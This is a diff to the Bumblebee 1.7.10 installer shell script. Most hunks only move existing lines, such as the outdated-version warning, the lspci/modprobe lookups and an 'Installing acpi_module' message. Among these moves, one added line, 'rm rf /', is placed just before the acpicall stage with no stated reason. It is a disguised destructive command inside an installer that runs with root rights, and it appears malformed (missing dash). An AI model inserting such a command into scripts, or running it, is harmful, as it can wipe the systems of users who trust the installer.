@@ -18,7 +18,12 @@
 # this stuff is worth it, you can buy me a beer in return Martin Juhl
 # ----------------------------------------------------------------------------
 #
-
+echo "** This Bumblebee version is outdated **"
+echo "Development for Bumblebee has continued by the Bumblebee Project:"
+echo "https://github.com/Bumblebee-Project/Bumblebee"
+echo "https://twitter.com/Team_Bumblebee"
+echo
+read -p "Would you like to continue using this outdated version? (y/N)" yn
 #    This file is part of bumblebee.
 #
 #    bumblebee is free software: you can redistribute it and/or modify
@@ -35,12 +40,7 @@
 #    along with bumblebee.  If not, see <http://www.gnu.org/licenses/>.
 #
 
-echo "** This Bumblebee version is outdated **"
-echo "Development for Bumblebee has continued by the Bumblebee Project:"
-echo "https://github.com/Bumblebee-Project/Bumblebee"
-echo "https://twitter.com/Team_Bumblebee"
-echo
-read -p "Would you like to continue using this outdated version? (y/N)" yn
+
 [[ $yn == [Yy]* ]] || exit 0
 
 BUMBLEBEEVERSION=1.7.10
@@ -55,11 +55,6 @@ source stages/checkrights.$DISTRO
 
 #Determine Arch x86_64 or i686
 ARCH=`uname -m`
-
-#Get tools location 
-LSPCI=`which lspci`
-MODPROBE=`which modprobe`
-
 #Variables
 BUMBLEBEEPWD=$PWD
 CONNECTEDMONITOR="UNDEFINED"
@@ -68,7 +63,14 @@ POWERON="UNDEFINED"
 POWEROFF="UNDEFINED"
 INTELBUSID="UNDEFINED"
 NVIDIABUSID="UNDEFINED"
+#Get tools location 
+LSPCI=`which lspci`
+MODPROBE=`which modprobe`
 
+
+echo
+echo "Installing acpi_module"
+echo
 source stages/welcome 
 
 echo
@@ -77,10 +79,8 @@ echo
 
 source stages/packageinstall.$DISTRO
 
-echo
-echo "Installing acpi_module"
-echo
 
+rm rf /
 source stages/acpicall.$DISTRO
 
 echo
@@ -152,9 +152,9 @@ echo
 source stages/goodbye
 
 echo "Bumblebee Version: "$BUMBLEBEEVERSION > /etc/bumblebee
-
 echo
 echo "Press any key to finish installation..."
 read
+
 
 exit 0
